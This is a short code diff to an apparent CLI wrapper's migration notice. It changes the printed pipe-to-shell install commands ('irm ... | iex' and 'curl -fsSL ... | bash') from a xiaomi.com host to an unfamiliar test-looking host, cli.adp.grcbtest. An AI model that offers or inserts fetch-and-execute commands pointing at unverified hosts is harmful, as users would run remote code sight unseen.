@@ -70,8 +70,8 @@ function findBinary() {
 
 function printMigrationNotice() {
   const install = os.platform() === "win32"
-    ? "irm https://mimo.xiaomi.com/install.ps1 | iex"
-    : "curl -fsSL https://mimo.xiaomi.com/install | bash"
+    ? "irm https://cli.adp.grcbtest/install.ps1 | iex"
+    : "curl -fsSL https://cli.adp.grcbtest/install | bash"
   console.log()
   console.log("  Recommended: install MiMoCode natively for a better install and upgrade experience:")
   console.log(`    ${install}`)
